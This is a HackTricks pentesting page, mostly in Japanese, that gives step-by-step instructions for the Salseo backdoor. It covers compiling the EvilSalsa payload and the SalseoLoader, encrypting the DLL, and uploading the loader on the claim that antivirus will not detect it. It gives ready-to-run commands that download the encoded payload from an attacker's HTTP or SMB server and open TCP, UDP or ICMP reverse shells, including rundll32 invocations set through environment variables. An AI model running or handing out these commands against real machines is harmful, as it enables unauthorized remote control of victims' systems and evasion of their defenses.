# Salseo

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## バイナリのコンパイル

githubからソースコードをダウンロードし、**EvilSalsa**と**SalseoLoader**をコンパイルします。コードをコンパイルするには**Visual Studio**が必要です。

使用するWindowsボックスのアーキテクチャに合わせてこれらのプロジェクトをコンパイルします（Windowsがx64をサポートしている場合は、そのアーキテクチャ用にコンパイルします）。

**Visual Studio**の**左側の「Build」タブ**の**「Platform Target」**で**アーキテクチャを選択**できます。

(\*\*このオプションが見つからない場合は、**「Project Tab」**をクリックし、次に**「\<Project Name> Properties」**をクリックします)

![](<../.gitbook/assets/image (839).png>)

次に、両方のプロジェクトをビルドします（Build -> Build Solution）（ログ内に実行可能ファイルのパスが表示されます）：

![](<../.gitbook/assets/image (381).png>)

## バックドアの準備

まず最初に、**EvilSalsa.dll**をエンコードする必要があります。そのためには、pythonスクリプト**encrypterassembly.py**を使用するか、プロジェクト**EncrypterAssembly**をコンパイルします：

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### ウィンドウズ
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Ok, now you have everything you need to execute all the Salseo thing: the **encoded EvilDalsa.dll** and the **binary of SalseoLoader.**

**SalseoLoader.exe バイナリをマシンにアップロードします。どのAVにも検出されないはずです...**

## **バックドアを実行する**

### **TCPリバースシェルを取得する（HTTPを通じてエンコードされたdllをダウンロードする）**

ncをリバースシェルリスナーとして起動し、エンコードされたevilsalsaを提供するHTTPサーバーを起動することを忘れないでください。
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **UDPリバースシェルの取得（SMBを通じてエンコードされたdllをダウンロード）**

リバースシェルリスナーとしてncを起動し、エンコードされたevilsalsaを提供するためにSMBサーバーを起動することを忘れないでください。
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **ICMPリバースシェルの取得（被害者の中にエンコードされたdllが既に存在する）**

**今回は、リバースシェルを受信するためにクライアントに特別なツールが必要です。ダウンロード：** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **ICMP応答を無効にする：**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### クライアントを実行する：
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### 被害者の内部で、salseoのことを実行しましょう:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## SalseoLoaderをDLLとしてコンパイルし、メイン関数をエクスポートする

Visual Studioを使用してSalseoLoaderプロジェクトを開きます。

### メイン関数の前に追加: \[DllExport]

![](<../.gitbook/assets/image (409).png>)

### このプロジェクトにDllExportをインストールする

#### **ツール** --> **NuGetパッケージマネージャー** --> **ソリューションのNuGetパッケージを管理...**

![](<../.gitbook/assets/image (881).png>)

#### **DllExportパッケージを検索（ブラウズタブを使用）し、インストールを押す（ポップアップを受け入れる）**

![](<../.gitbook/assets/image (100).png>)

プロジェクトフォルダーに**DllExport.bat**と**DllExport\_Configure.bat**のファイルが表示されます。

### **U**ninstall DllExport

**アンインストール**を押します（そう、変ですが信じてください、必要です）

![](<../.gitbook/assets/image (97).png>)

### **Visual Studioを終了し、DllExport\_configureを実行する**

ただ**終了**します

次に、**SalseoLoaderフォルダー**に移動し、**DllExport\_Configure.bat**を実行します。

**x64**を選択します（x64ボックス内で使用する場合、私のケースです）、**System.Runtime.InteropServices**を選択します（**DllExportの名前空間内**）そして**適用**を押します。

![](<../.gitbook/assets/image (882).png>)

### **Visual Studioでプロジェクトを再度開く**

**\[DllExport]**はもはやエラーとしてマークされていないはずです。

![](<../.gitbook/assets/image (670).png>)

### ソリューションをビルドする

**出力タイプ = クラスライブラリ**を選択します（プロジェクト --> SalseoLoaderプロパティ --> アプリケーション --> 出力タイプ = クラスライブラリ）

![](<../.gitbook/assets/image (847).png>)

**x64** **プラットフォーム**を選択します（プロジェクト --> SalseoLoaderプロパティ --> ビルド --> プラットフォームターゲット = x64）

![](<../.gitbook/assets/image (285).png>)

ソリューションを**ビルド**するには: ビルド --> ソリューションのビルド（出力コンソール内に新しいDLLのパスが表示されます）

### 生成されたDllをテストする

テストしたい場所にDllをコピーして貼り付けます。

実行:
```
rundll32.exe SalseoLoader.dll,main
```
エラーが表示されない場合、おそらく機能するDLLがあります!!

## DLLを使用してシェルを取得する

**HTTP** **サーバー**を使用し、**nc** **リスナー**を設定することを忘れないでください。

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
{% hint style="success" %}
AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>
{% endhint %}
